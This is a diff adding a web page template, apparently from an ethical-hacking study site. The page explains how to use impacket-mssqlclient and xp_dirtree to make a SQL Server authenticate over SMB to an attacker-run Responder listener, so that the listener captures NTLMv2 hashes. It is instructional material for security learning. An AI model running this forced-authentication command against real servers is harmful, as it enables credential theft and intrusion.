@@ -1,0 +1,27 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>Usage</h1>
+    <div class="code-box"><pre><code>impacket-mssqlclient USER_NAME:PASSWORD@DOMAIN.dmn <u>-windows-auth</u>
+<u class="blue">※If the user is only for MSSQL, you have to remove -windows-auth flag.</u>
+
+SQL (PublicUser  guest@master)> EXEC MASTER.sys.xp_dirtree '\\LOCAL_IP\test', 1, 1</code></pre></div>
+
+<ul>
+    <li><code>xp_dirtree</code> asks the SQL Server process (on the target) to enumerate the directory tree at the UNC path you provided. SQL Server acts like an SMB client and attempts to open <code>\10.10.16.38\test</code>.</li>
+    <li>The server resolves the target (in your example you used an IP, so DNS/LLMNR is bypassed) and tries to establish an SMB session (TCP/445 or NetBIOS ports).</li>
+    <li>If the target (attacker) accepts connections and responds like an SMB server, the target machine (the SQL host) will start SMB authentication. For NTLM authentication the flow is:</li>
+    <li>Client (SQL server) sends "NEGOTIATE" → requests auth type.</li>
+    <li>Server (Responder) replies with "CHALLENGE".</li>
+    <li>Client computes an NTLMv2 response using the account's NT hash (or machine account hash if using machine credentials) + challenge, and sends the response back.</li>
+</ul>
+
+</body>
+</html>
